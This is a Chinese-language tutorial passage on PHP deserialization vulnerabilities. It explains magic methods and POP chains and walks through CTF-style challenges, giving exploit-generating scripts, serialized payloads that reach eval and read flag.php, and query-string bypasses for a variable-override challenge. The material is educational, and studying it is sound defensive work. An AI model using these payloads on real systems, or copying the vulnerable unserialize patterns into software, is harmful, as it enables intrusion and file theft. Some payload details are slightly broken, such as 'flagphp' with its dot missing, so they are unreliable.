<p>这里有两个值得注意的地方：</p>
<ol>
<li>
<p>不同类型类属性</p>
<p>private属性序列化的格式：<code>%00类名%00属性名</code></p>
<p>protect属性序列化的格式：<code>%00*%00属性名</code></p>
</li>
<li>
<p>序列化只序列化类属性，不序列化类方法</p>
</li>
</ol>
<p>所以在利用反序列化漏洞的时候：</p>
<ol>
<li><strong>我们在反序列化的时候一定要保证在当前的作用域环境下有该类存在</strong></li>
<li><strong>我们在反序列化攻击的时候也就是依托类属性进行攻击</strong></li>
</ol>
<h3 id="PHP的反序列化">PHP的反序列化</h3>
<p>有序列化对象为压缩格式化的字符串，就有反序列化将压缩格式化的字符串还原，我们还是沿用上面的代码，先将序列化的内容存放在<code>serialize.txt</code> 里面，然后再进行反序列化，并输出属性值<code>name</code>和<code>age</code>的值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $name = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">	<span class="keyword">protected</span> $gender = <span class="string">&#x27;male&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> $age = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_name</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">new</span> Person();</span><br><span class="line">$user-&gt;set_name(<span class="string">&#x27;ca01h&#x27;</span>);</span><br><span class="line">$data = serialize($user);</span><br><span class="line"><span class="comment">// echo $data;</span></span><br><span class="line">$data = unserialize($data);</span><br><span class="line"><span class="keyword">echo</span> $data-&gt;age;</span><br><span class="line"><span class="keyword">echo</span> $data-&gt;get_name();</span><br></pre></td></tr></table></figure>
<p>反序列化结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">18</span><br><span class="line">ca01h</span><br></pre></td></tr></table></figure>
<p>那么稍微延申一点，如果<code>$data</code>参数是用户可控的呢，比如我传入一个如下参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:6:&quot;Person&quot;:3:&#123;s:12:&quot;&lt;0x00&gt;Person&lt;0x00&gt;name&quot;;s:5:&quot;hacker&quot;;s:9:&quot;&lt;0x00&gt;*&lt;0x00&gt;gender&quot;;s:4:&quot;female&quot;;s:3:&quot;age&quot;;i:17;&#125;</span><br></pre></td></tr></table></figure>
<p>这样就人为的改变了类属性的值，由此引出PHP反序列化漏洞。</p>
<h2 id="0x02-PHP反序列化漏洞">0x02 PHP反序列化漏洞</h2>
<p>反序列化漏洞的成因在于代码中的 unserialize() 接收的参数可控，从上面的例子看，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现最终的攻击。</p>
<h3 id="魔法方法调用">魔法方法调用</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200507162522.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $name = <span class="string">&quot;Bob&quot;</span>;</span><br><span class="line">	<span class="keyword">private</span> $id = <span class="string">&quot;417&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;this is __construct&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;this is __destruct&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;this is __invoke&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;this is __toString&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;this is __wakeup&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;this is __sleep&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;id&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$args</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;this is __call. name is &quot;</span>.$name.<span class="string">&quot; args is &quot;</span>.$args.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$arg</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span><span class="string">&quot;call __get&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$name,$id</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;call __set&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$r = <span class="keyword">new</span> User(<span class="string">&quot;Alice&quot;</span>);</span><br><span class="line">$r();</span><br><span class="line"><span class="keyword">echo</span> $r;</span><br><span class="line">unserialize(serialize($r));</span><br><span class="line">$r-&gt;print(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">$r-&gt;id;</span><br><span class="line">$r-&gt;id = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>输出顺序如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">this is __construct</span><br><span class="line">this is __invoke</span><br><span class="line">this is __toString</span><br><span class="line">this is __sleep</span><br><span class="line">this is __wakeup</span><br><span class="line">this is __destruct</span><br><span class="line">this is __call. name is print args is Array</span><br><span class="line">call __get</span><br><span class="line">call __set</span><br><span class="line">this is __destruct</span><br></pre></td></tr></table></figure>
<p>其中<code>__toString()</code>触发方式比较多：</p>
<ol>
<li>echo (<code>$obj</code>) / print(<code>$obj</code>) 打印时会触发</li>
<li>反序列化对象与字符串连接时</li>
<li>反序列化对象参与格式化字符串时</li>
<li>反序列化对象与字符串进行<mark>比较时（PHP进行</mark>比较的时候会转换参数类型）</li>
<li>反序列化对象参与格式化SQL语句，绑定参数时</li>
<li>反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</li>
<li>在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有<strong>toString返回的字符串的时候</strong>toString会被调用</li>
<li>反序列化的对象作为 class_exists() 的参数的时候</li>
</ol>
<h3 id="魔法方法的作用">魔法方法的作用</h3>
<p>我们上面讲过，在我们的攻击中，反序列化函数 unserialize() 是我们攻击的入口，也就是说，只要这个参数可控，我们就能传入任何的已经序列化的对象（只要这个类在当前作用域存在我们就可以利用），而不是局限于出现 unserialize() 函数的类的对象，如果只能局限于当前类，那我们的攻击面也太狭小了，这个类不调用危险的方法我们就没法发起攻击。</p>
<p>但是我们又知道，你反序列化了其他的类对象以后我们只是控制了是属性，如果你没有在完成反序列化后的代码中调用其他类对象的方法，我们还是束手无策，毕竟代码是人家写的，人家本身就是要反序列化后调用该类的某个安全的方法，你总不能改人家的代码吧，但是没关系，因为我们有魔法方法。</p>
<p>魔法正如上面介绍的，魔法方法的调用是在该类序列化或者反序列化的同时自动完成的，不需要人工干预，这就非常符合我们的想法，因此只要魔法方法中出现了一些我们能利用的函数，我们就能通过反序列化中对其对象属性的操控来实现对这些函数的操控，进而达到我们发动攻击的目的。</p>
<h3 id="魔法方法的简单利用">魔法方法的简单利用</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;i am ca01h&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> L();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;function action() in class L&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test2;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[<span class="string">&#x27;test&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>首先我们能看到<code>unserialize()</code>函数的参数我们是可以控制的，也就是说我们能通过这个接口反序列化任何类的对象(但只有在当前作用域的类才对我们有用)，那我们看一下当前这三个类，我们看到后面两个类反序列化以后对我们没有任何意义，因为我们根本没法调用其中的方法，但是第一个类就不一样了，虽然我们也没有什么代码能实现调用其中的方法的，但是我们发现他有一个魔法函数<code> __destruct()</code> ，这就非常有趣了，因为这个函数能在对象销毁的时候自动调用，不用我们人工的干预，接下来让我们看一下怎么利用。</p>
<p>我们看到<code>__destruct()</code>里面只用到了一个属性<code>test</code>，再观察一下 那些地方调用了<code>action()</code>函数，看看这个函数的调用中有没有存在执行命令或者是其他我们能利用的点的，果然在 <code>Evil</code> 这个类中发现他的 <code>action() </code>函数调用了<code> eval()</code>,那我们的想法就很明确了，只需要将<code>demo</code>这个类中的<code>test</code>属性篡改为 <code>Evil </code>这个类的对象，然后为了<code> eval</code> 能执行命令，我们还要篡改<code>Evil</code>对象的<code> test2</code> 属性，将其改成要执行的命令。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> Evil();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test2 = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$demo = <span class="keyword">new</span> demo();</span><br><span class="line">$data = serialize($demo);</span><br><span class="line">var_dump($data);</span><br></pre></td></tr></table></figure>
<p>输出的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;demo&quot;:1:&#123;s:10:&quot;\000demo\000test&quot;;O:4:&quot;Evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:9:&quot;phpinfo()&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>这样就完成了一个简单的PHP反序列化漏洞的利用。</p>
<p><strong>通过这个简单的例子总结一下寻找 PHP 反序列化漏洞的方法或者流程</strong></p>
<p>(1)寻找<code>unserialize()</code>函数的参数是否有我们的可控点；<br>
(2)寻找我们的反序列化的目标，重点寻找存在 <code>wakeup()</code> 或 <code>destruct()</code> 魔法函数的类；<br>
(3)<strong>一层一层</strong>地研究该类在魔法方法中使用的属性和属性调用的方法，看看是否有可控的属性能实现在当前调用的过程中触发的；<br>
(4)找到我们要控制的属性了以后我们就将要用到的代码部分复制下来，然后构造序列化，发起攻击。</p>
<h2 id="0x03-PHP反序列化POP链">0x03 PHP反序列化POP链</h2>
<h3 id="POP链介绍">POP链介绍</h3>
<p>POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是<strong>从现有运行环境</strong>中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的</p>
<p>说的再具体一点就是 ROP 是通过栈溢出实现控制指令的执行流程，而我们的反序列化是通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的。</p>
<h3 id="POP链demo">POP链demo</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;file_get(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">        <span class="keyword">echo</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source.<span class="string">&#x27;Welcome&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) 		 &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;hello&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $show = <span class="keyword">new</span> Show(<span class="string">&#x27;pop3.php&#x27;</span>);</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>寻找POP链过程：</p>
<ul>
<li>66行代码处有<code>unserialize()</code>函数，而且参数可控；</li>
<li>在<code>Show</code>这个类中有<code>__wakeup()</code>方法；</li>
<li><code>__wakeup()</code>方法中调用了<code>preg_replace()</code>函数，如果<code>source</code>属性是某一个类对象的话，会触发<code>__toString()</code>方法；</li>
<li>在<code>Show</code>这个类中有<code>__toString()</code>方法；</li>
<li><code>__toSting()</code>方法中试图获取属性<code>str</code>中key为<code>str</code>的值的<code>source</code>属性，如果<code>str['str']</code>是某一个类对象的话，会触发<code>__get()</code>方法；</li>
<li>在<code>Test</code>这个类中有<code>__get()</code>方法；</li>
<li><code>__get()</code>方法中，如果<code>p</code>属性是某一个类对象的话，会出发<code>__invoke()</code>方法；</li>
<li>在<code>Read</code>这个类中有<code>__invoke()</code>方法；</li>
<li><code>__invoke()</code>方法中尝试读取并打印属性<code>var</code>的文件内容，为了读取<code>flag.php</code>的内容，可以让<code>var = flag.php</code>。</li>
</ul>
<p>生成反序列化Payload的exp：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var = flag.php;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$r = <span class="keyword">new</span> Read();</span><br><span class="line">$s = <span class="keyword">new</span> Show();</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$t-&gt;p = $r;</span><br><span class="line">$s-&gt;str[<span class="string">&#x27;str&#x27;</span>] = $t;</span><br><span class="line">$s-&gt;source = $s;</span><br><span class="line">var_dump(serialize($s));</span><br></pre></td></tr></table></figure>
<p>最后得出来的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;r:1;s:3:&quot;str&quot;;a:1:&#123;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:4:&quot;Read&quot;:1:&#123;s:3:&quot;var&quot;;s:7:&quot;flagphp&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>有关PHP反序列化的基础篇就写到这，当然肯定不止于此，接下来是进阶篇，涉及到SoapClient反序列化，PHP反序列化字符逃逸，Phar反序列化，Session反序列化，以及最后一个VulnHub靶机收尾。</p>
<h2 id="0x04-一道实例">0x04 一道实例</h2>
<p>该题出处：<a href="https://www.cnblogs.com/nul1/p/9928797.html">https://www.cnblogs.com/nul1/p/9928797.html</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$method, $args</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">        $str=preg_replace(<span class="string">&quot;/[&lt;&gt;*;|?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,$str);</span><br><span class="line">        $str=str_replace(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echos</span>(<span class="params">$host</span>)</span>&#123;</span><br><span class="line">        system(<span class="string">&quot;echos <span class="subst">$host</span>&quot;</span>.$host);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;echos&quot;</span>))) &#123;</span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$first=<span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">$var=<span class="string">&#x27;var&#x27;</span>;</span><br><span class="line">$bbb=<span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line">$ccc=<span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line">$i=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">if</span>($i===<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $i++;</span><br><span class="line">        $$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($first===<span class="string">&quot;doller&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    @parse_str($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>($var===<span class="string">&quot;give&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>($bbb===<span class="string">&quot;me&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>($ccc===<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;welcome!&lt;br&gt;&quot;</span>;</span><br><span class="line">                $come=@$_POST[<span class="string">&#x27;come&#x27;</span>];</span><br><span class="line">                unserialize($come);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;think about it&lt;br&gt;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NO&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Can you hack me?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="变量覆盖漏洞">变量覆盖漏洞</h3>
<h4 id="">$$</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">if</span>($i===<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $i++;</span><br><span class="line">        $$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>?first=doller</code>绕过第一个if语句</p>
<h4 id="parse-str">parse_str</h4>
<p>如果直接这样写<code>?first=doller&amp;a=var=give&amp;bbb=me&amp;ccc=flag</code>的话，PHP解析的是四个参数，而不是我想得到的两个参数：一个<code>first</code>和一个<code>a</code>。不过好在有URL编码这种东西，可以在这有歧义的时候扭转局势，我们把<code>&amp;</code>进行URL编码，这样子解析时就会认为是一个字符串了，即：</p>
<p><code>?first=doller&amp;a=var=give%26bbb=me%26ccc=flag</code></p>
<h3 id="反序列化漏洞">反序列化漏洞</h3>
<p>查看代码，发现到了反序列化的地方了，而反序列化的来源是通过POST提交的come参数，知道了要反序列化，接下来就是确定要反序列化的类了。这个源码就一个类come，对这个类进行审计，重点看<code>__destruct</code>方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;echos&quot;</span>))) &#123;</span><br><span class="line">      call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
